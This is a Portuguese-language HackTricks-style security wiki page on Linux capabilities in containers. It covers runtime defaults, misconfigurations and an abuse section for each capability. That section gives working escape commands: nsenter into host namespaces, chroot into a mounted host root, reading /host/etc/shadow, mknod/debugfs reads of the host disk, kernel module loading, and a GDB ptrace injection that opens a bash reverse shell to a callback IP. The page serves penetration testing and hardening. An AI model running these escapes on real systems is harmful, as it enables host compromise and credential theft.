# Capabilities do Linux em Contêineres

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

As capabilities do Linux são uma das partes mais importantes da segurança de contêineres porque respondem a uma pergunta sutil, mas fundamental: **o que realmente significa ser "root" dentro de um contêiner?** Em um sistema Linux normal, o UID 0 historicamente implicava um conjunto muito amplo de privilégios. Nos kernels modernos, esses privilégios são divididos em unidades menores chamadas capabilities. Um processo pode ser executado como root e ainda não ter muitas operações poderosas disponíveis se as capabilities relevantes tiverem sido removidas. <sup>[[1]](#references)</sup>

Os contêineres dependem muito dessa distinção. Muitas workloads ainda são iniciadas como UID 0 dentro do contêiner por motivos de compatibilidade ou simplicidade. Sem remover capabilities, isso seria perigoso demais. Com as capabilities removidas, um processo root em um contêiner ainda pode realizar muitas tarefas comuns dentro dele, mas não pode executar operações mais sensíveis do kernel. É por isso que um shell em um contêiner que exibe `uid=0(root)` não significa automaticamente "root no host", nem mesmo que tenha "amplos privilégios no kernel". Os conjuntos de capabilities determinam o valor real dessa identidade root.

Para consultar a referência completa das capabilities do Linux e muitos exemplos de abuso, veja:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operação

As capabilities são controladas em vários conjuntos, incluindo os conjuntos permitted, effective, inheritable, ambient e bounding. Para muitas avaliações de contêineres, a semântica exata de cada conjunto no kernel é menos importante do que a questão prática final: **quais operações privilegiadas esse processo pode executar com sucesso agora, e quais ganhos futuros de privilégio ainda são possíveis?** <sup>[[1]](#references)</sup>

Isso importa porque muitas técnicas de escape são, na verdade, problemas de capabilities disfarçados de problemas de contêineres. Uma workload com `CAP_SYS_ADMIN` pode acessar uma enorme quantidade de funcionalidades do kernel que um processo root em um contêiner normal não deveria acessar. Uma workload com `CAP_NET_ADMIN` se torna muito mais perigosa se também compartilhar o namespace de rede do host. Uma workload com `CAP_SYS_PTRACE` se torna muito mais interessante se puder ver processos do host por meio do compartilhamento do PID do host. No Docker ou Podman, isso pode aparecer como `--pid=host`; no Kubernetes, geralmente aparece como `hostPID: true`.

Em outras palavras, o conjunto de capabilities não pode ser avaliado isoladamente. Ele precisa ser analisado em conjunto com namespaces, seccomp e a política MAC.

## Laboratório

Uma maneira bem direta de inspecionar as capabilities dentro de um contêiner é:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Você também pode comparar um contêiner mais restritivo com outro ao qual todas as capabilities foram adicionadas:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Para ver o efeito de uma adição restrita, tente remover tudo e adicionar novamente apenas uma capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Esses pequenos experimentos ajudam a mostrar que um runtime não está simplesmente alternando um booleano chamado "privileged". Ele está moldando a superfície de privilégios efetivamente disponível para o processo.

## Capacidades de Alto Risco

As capabilities só se tornam primitivas de escape quando sua operação alcança um **recurso controlado pelo host**. As combinações recorrentes de alto risco são:

- **`CAP_SYS_ADMIN`** junto com um PID do host, um dispositivo de bloco ou um caminho gravável de controle do kernel. Para ingressar em um namespace de montagem alvo, também é necessário `CAP_SYS_CHROOT`; para montar um sistema de arquivos baseado em bloco, é necessário `CAP_SYS_ADMIN` no namespace de usuário inicial.
- **`CAP_SYS_PTRACE`** junto com visibilidade dos PIDs do host e um processo do host ao qual seja possível se conectar. `CAP_SYS_ADMIN` não é necessário para ptrace injection.
- **`CAP_DAC_OVERRIDE` ou `CAP_DAC_READ_SEARCH`** junto com um sistema de arquivos do host acessível. Essas capabilities ignoram verificações DAC diferentes, mas não criam uma visão do sistema de arquivos do host.
- **`CAP_SYS_MODULE`** no namespace de usuário inicial junto com um módulo aceito e compatível com o kernel. Contêineres Linux comuns compartilham o kernel do nó; runtimes de VM ou de kernel em espaço de usuário alteram esse limite.
- **`CAP_MKNOD`** no namespace de usuário inicial junto com um dispositivo real do host que já seja permitido pelo device cgroup. Criar um nó não ignora o device cgroup.
- **`CAP_SYS_RAWIO`** junto com uma interface exposta e utilizável de memória, porta de I/O, PCI ou controle de dispositivo.
- **`CAP_SYS_BOOT`** junto com o namespace PID inicial para reiniciar o host, ou um caminho kexec utilizável e permitido para substituir o kernel.
- **`CAP_NET_ADMIN`** no namespace de rede do host para controlar diretamente o estado da rede do nó. **`CAP_NET_RAW`** pode participar de um escape específico de protocolo, mas sockets raw, por si só, não dão acesso a um shell no nó.

`CAP_SYS_CHROOT` não está listado deliberadamente como uma capability de escape independente. Ela pode ser necessária para `setns()` em um namespace de montagem e pode facilitar o uso de uma árvore do host já acessível, mas `chroot()` sozinho não expõe essa árvore nem concede novas permissões de sistema de arquivos. Da mesma forma, `CAP_BPF` e `CAP_PERFMON` expõem uma poderosa superfície de telemetria e ataque ao kernel, mas, sem uma falha separada no kernel, suas operações comuns não são escapes genéricos de contêiner.

## Uso de Runtime

Docker, Podman, stacks baseadas em containerd e CRI-O usam controles de capabilities, mas os padrões e as interfaces de gerenciamento diferem. O Docker as expõe diretamente por meio de flags como `--cap-drop` e `--cap-add`. O Podman oferece controles semelhantes e costuma combiná-los com execução rootless como uma camada adicional de segurança. O Kubernetes disponibiliza adições e remoções de capabilities por meio do `securityContext` do Pod ou do contêiner; runtimes de nível inferior expressam os conjuntos resultantes na configuração do runtime OCI. Ambientes de contêineres de sistema, como LXC e Incus, também dependem do controle de capabilities, mas sua integração mais ampla com o host pode levar operadores a flexibilizar os padrões mais do que fariam para um contêiner de aplicação. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

O mesmo princípio vale para todos eles: uma capability que é tecnicamente possível conceder não é necessariamente uma capability que deva ser concedida. Muitos incidentes do mundo real começam quando um operador adiciona uma capability simplesmente porque uma carga de trabalho falhou com uma configuração mais restritiva e a equipe precisava de uma solução rápida.

## Configurações Incorretas

O erro mais óbvio é **`--cap-add=ALL`** em CLIs no estilo Docker/Podman, mas não é o único. Na prática, um problema mais comum é conceder uma ou duas capabilities extremamente poderosas, especialmente `CAP_SYS_ADMIN`, para "fazer a aplicação funcionar", sem também entender as implicações de namespaces, seccomp e montagens. Outro modo comum de falha é combinar capabilities adicionais com o compartilhamento de namespaces do host. No Docker ou Podman, isso pode aparecer como `--pid=host`, `--network=host` ou `--userns=host`; no Kubernetes, a exposição equivalente costuma aparecer em configurações da carga de trabalho, como `hostPID: true` ou `hostNetwork: true`. Cada uma dessas combinações altera aquilo que a capability pode efetivamente afetar.

Também é comum ver administradores acreditarem que, por uma carga de trabalho não estar totalmente em `--privileged`, ela ainda está significativamente restrita. Às vezes isso é verdade, mas, em outros casos, a postura efetiva já está próxima o suficiente de privilegiada para que a distinção deixe de importar operacionalmente.

## Abuso

Comece registrando os conjuntos efetivos, o mapeamento do namespace de usuário, o estado do seccomp, os namespaces, as montagens e os dispositivos. O nome de uma capability, sem esse contexto, não comprova um escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces e dispositivos de bloco

Com visibilidade de PID do host, `CAP_SYS_ADMIN` pode entrar nos namespaces do host. A operação de namespace de montagem também exige `CAP_SYS_CHROOT` no namespace de usuário do chamador.

**Verifique a capability e o confinamento:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Enumere o alvo:** confirme o compartilhamento de PID do host pela configuração do container/Pod ou por uma lista inequívoca de processos do host e, em seguida, inspecione os namespaces do alvo. Também existe um PID 1 local em namespaces de PID privados; portanto, sua presença, por si só, não comprova o compartilhamento de PID do host.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Explore o caminho do namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

As verificações de capabilities precisam ser bem-sucedidas nos user namespaces que possuem os alvos. `--pid=host` ou `hostPID: true` no Kubernetes fornece visibilidade; não fornece as capabilities.

Para o caminho alternativo de dispositivo de bloco, **enumere** os candidatos e, em seguida, **explore** o filesystem acessível montando primeiro o candidato validado em modo somente leitura:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

O nó de dispositivo deve existir, o cgroup de dispositivos deve permiti-lo, e montagens de sistemas de arquivos de bloco exigem `CAP_SYS_ADMIN` no namespace de usuário inicial. Um root do host já montado via bind em `/host` dá acesso ao host **sem** `CAP_SYS_ADMIN`; `chroot /host` é apenas uma conveniência e requer separadamente `CAP_SYS_CHROOT`.

### Root do host acessível: execução direta no sistema de arquivos

Se o root do host já estiver montado em `/host`, primeiro confirme a montagem e então use o acesso existente diretamente. Esse caminho não depende de `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Se `chroot()` não estiver disponível, mas o binário do host for compatível com a arquitetura e o loader do container, muitas vezes ele pode ser chamado por meio da árvore montada:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Leituras e gravações diretas em `/host` já representam comprometimento do sistema de arquivos do host. `chroot()` ou executar um binário do host apenas tornam esse acesso mais conveniente; nenhuma das operações cria a montagem do host nem contorna uma montagem somente leitura ou uma política MAC.

### `CAP_SYS_PTRACE`: injeção em processo do host

Com visibilidade dos PID do host e `CAP_SYS_PTRACE` no namespace de usuário do alvo, o GDB pode fazer um processo aprovado do host chamar `system()`. `CAP_SYS_ADMIN` não é necessário.

**Verifique a capacidade e os controles de anexação:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Enumere e selecione um alvo descartável:** confirme o compartilhamento de PID do host pela configuração ou por uma lista inequívoca de processos do nó; nunca selecione o PID 1 nem um daemon crítico.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Explore o processo selecionado:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

O alvo precisa permitir anexação e ter um símbolo `system()` utilizável e um caminho para o payload do Bash. Yama, o estado não dumpable, seccomp, user namespaces e a política MAC podem bloquear a cadeia. O GDB interrompe o alvo enquanto está anexado, então use apenas um processo descartável de laboratório.

### `CAP_DAC_OVERRIDE` e `CAP_DAC_READ_SEARCH`: arquivos protegidos do host

Essas capabilities não expõem o sistema de arquivos do host. Se `/host` já for um mount do host, `CAP_DAC_READ_SEARCH` pode ignorar as verificações DAC de leitura/busca, e `CAP_DAC_OVERRIDE` pode, adicionalmente, ignorar as verificações comuns de escrita:

**Verifique as capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumere o sistema de arquivos do host exposto e as permissões do alvo:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Teste os bypasses de leitura e escrita** em um laboratório descartável:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Uma montagem somente leitura e as regras do LSM ainda se aplicam. `CAP_DAC_READ_SEARCH` também autoriza `open_by_handle_at()`, mas um breakout como o Shocker também exige um descritor de arquivo de mount para o mesmo sistema de arquivos subjacente, handles válidos ou que possam ser descobertos, um layout compatível de sistema de arquivos/armazenamento e nenhuma restrição do runtime ou do LSM. Isso não fornece acesso arbitrário a todos os sistemas de arquivos fora do namespace de mount.

### `CAP_SYS_MODULE`: execução no kernel compartilhado

Em um container Linux comum, um módulo aceito é executado no kernel compartilhado do host.

**Verifique o escopo da capability e do user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumere os pré-requisitos para o carregamento de módulos:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Use exploit apenas com um módulo de prova compatível e previamente revisado em um nó descartável:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

A capability precisa estar efetiva no namespace de usuário inicial. A versão e a configuração do kernel, as assinaturas dos módulos, o lockdown, o seccomp e a política do LSM precisam permitir o carregamento. Kata, gVisor, isolamento do Hyper-V e runtimes semelhantes alteram qual limite do kernel a carga de trabalho alcança.

### `CAP_MKNOD`: criar um handle de dispositivo permitido

`CAP_MKNOD` cria um nó de dispositivo, mas não contorna o cgroup de dispositivos. A criação de dispositivos não é namespaced, então a capability precisa estar efetiva no namespace de usuário inicial.

**Verifique a capability e o escopo do namespace de usuário:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumere os dispositivos reais, seus números major/minor e qualquer lista de permissões visível do cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Explore uma candidata validada da família ext em modo somente leitura:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Outros sistemas de arquivos precisam de uma ferramenta correspondente somente leitura; montar o dispositivo também requer `CAP_SYS_ADMIN`. `Operation not permitted` ao abrir o nó criado geralmente indica que o cgroup de dispositivos ainda o bloqueia. No cgroup v2, o acesso a dispositivos costuma ser imposto com BPF, e não existe um arquivo `devices.list`; portanto, conseguir abrir o dispositivo é o teste decisivo.

### `CAP_SYS_RAWIO`: interface raw-I/O exposta

Não há um payload genérico portátil: os endereços e efeitos válidos dependem do hardware e da configuração do kernel.

**Verifique a capability e o escopo do user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumere as interfaces raw, o hardware e os drivers expostos:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Explore apenas com uma prova aprovada para o dispositivo e o intervalo de endereços identificados.** Se `/dev/mem` for a interface aprovada pelo laboratório, este modelo comprova a divulgação da memória do nó sem imprimir seu conteúdo:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

O endereço deve vir do mapa de hardware do laboratório, pois a leitura de algumas regiões MMIO pode ter efeitos colaterais. Um comando genérico de escrita na memória seria enganoso e inseguro: o mesmo endereço pode ser inofensivo em uma máquina e controlar hardware ou memória do kernel em outra. Cgroups de dispositivos, permissões do sistema de arquivos, restrições rigorosas em `/dev/mem`, kernel lockdown, virtualização e políticas de LSM geralmente impedem o acesso útil.

### `CAP_SYS_BOOT`: reinicialização do namespace ou substituição do kernel

Em um namespace PID privado, `reboot()` encerra o processo init desse namespace, em vez de reiniciar o host. Portanto, o impacto de reiniciar o host requer o namespace PID inicial, normalmente por meio do compartilhamento de PID do host. Um caminho com kexec também precisa de uma imagem de kernel compatível e de uma política permissiva de lockdown/assinatura:

**Verifique a capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumere os pré-requisitos de PID-namespace e kexec:** confirme o compartilhamento de PID do host na configuração da carga de trabalho, pois um link para um namespace PID, por si só, não revela se ele é o namespace inicial do nó.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploit apenas quando reiniciar um nó de laboratório descartável for o exercício explícito:**

```bash
sync
reboot -f
```

Não execute esse comando nem carregue um kernel em um nó compartilhado apenas para comprovar a capability. Em um namespace PID privado, ele encerra apenas o processo init desse namespace e não demonstra impacto no host.

### `CAP_NET_ADMIN` e `CAP_NET_RAW`: caminhos de rede do host

`CAP_NET_ADMIN` afeta apenas o namespace de rede atual.

**Verifique as capabilities e o confinamento:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumere a rede atual e confirme, na configuração da carga de trabalho, o uso da rede do host:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Exercite `CAP_NET_ADMIN` de forma reversível:** com a rede do host, a interface temporária é uma interface do nó.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` permite sockets RAW e PACKET, mas não é um shell genérico do host. Para **enumerar** a cadeia documentada do GCE, verifique a rota de metadados e capture se o tráfego não criptografado do guest-agent é observável:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Se os pré-requisitos correspondentes existirem, **explore** a cadeia específica do ambiente conforme documentada em [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): capture a requisição e o estado da sequência, injete a resposta forjada de metadados que contém uma chave SSH e, em seguida, valide o acesso ao host. A cadeia exigia root, rede do host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, tráfego de metadados GCE em texto claro e uma requisição do guest agent suscetível a condição de corrida; o transporte ou comportamento moderno do agent pode impedir a exploração.

### Restrições de origem local e endereços de interface

Um listener pode rejeitar conexões cuja origem seja `127.0.0.1`, mas ignorar outro endereço atribuído ao mesmo network namespace. Se o listener estiver acessível por essa interface, compare uma conexão via loopback com outra vinculada a um endereço local não loopback existente. `CAP_NET_ADMIN` pode permitir a configuração de interfaces no namespace atual, mas não é necessária se já houver um endereço adequado atribuído. `CAP_NET_RAW` não é um pré-requisito para uma conexão TCP comum. Trata-se de uma falha na classificação do endereço de origem, não de um escape de container nem de uma prova de que a aplicação autorizará uma requisição privilegiada.<sup>[[1]](#references)[[7]](#references)</sup>

Para um listener WebSocket, uma resposta HTTP `101 Switching Protocols` válida confirma que o handshake inicial foi concluído; um erro subsequente no nível da aplicação pode indicar que a conexão chegou ao handler. Nenhuma das respostas comprova que a autenticação ou a operação solicitada foi bem-sucedida.<sup>[[8]](#references)</sup>

## Verificações

O objetivo das verificações de capabilities não é apenas exibir valores brutos, mas entender se o processo tem privilégios suficientes para tornar perigosa a configuração atual de namespaces e mounts.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

O que é interessante aqui:

- `capsh --print` é a forma mais fácil de identificar capabilities de alto risco, como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- A linha `CapEff` em `/proc/self/status` informa o que está efetivamente ativo agora, e não apenas o que pode estar disponível em outros conjuntos.
- Um dump de capabilities se torna muito mais importante se o container também compartilhar namespaces de PID, rede ou usuário do host, ou tiver mounts do host com permissão de escrita.

Depois de coletar as informações brutas sobre capabilities, o próximo passo é interpretá-las. Verifique se o processo é root, se os user namespaces estão ativos, se os namespaces do host são compartilhados, se o seccomp está impondo restrições e se o AppArmor ou o SELinux ainda restringem o processo. Um conjunto de capabilities, por si só, é apenas parte da história, mas muitas vezes explica por que um escape de container funciona e outro falha, mesmo partindo aparentemente das mesmas condições.

## Padrões de runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Conjunto reduzido de capabilities por padrão | O Docker mantém uma allowlist padrão de capabilities e descarta as demais | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto reduzido de capabilities por padrão | Os containers do Podman não são privilegiados por padrão e usam um modelo reduzido de capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Herda os padrões do runtime, a menos que sejam alterados | Se nenhum `securityContext.capabilities` for especificado, o container recebe o conjunto padrão de capabilities do runtime | `securityContext.capabilities.add`, não definir `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O no Kubernetes | Geralmente, padrão do runtime | O conjunto efetivo depende do runtime e da especificação do Pod | Igual à linha do Kubernetes; a configuração direta de OCI/CRI também pode adicionar capabilities explicitamente |

No Kubernetes, o importante é que a API não define um conjunto padrão universal de capabilities. Se o Pod não adicionar nem descartar capabilities, a workload herda o padrão do runtime daquele nó.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - página do manual do Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - configuração de containers Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - privilégios de runtime e capabilities do Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Documentação do Kubernetes - definir capabilities para um container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Documentação do Podman - `--cap-add` e `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Documentação do Incus - segurança](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - implementação do protocolo IPv4 no Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - o protocolo WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
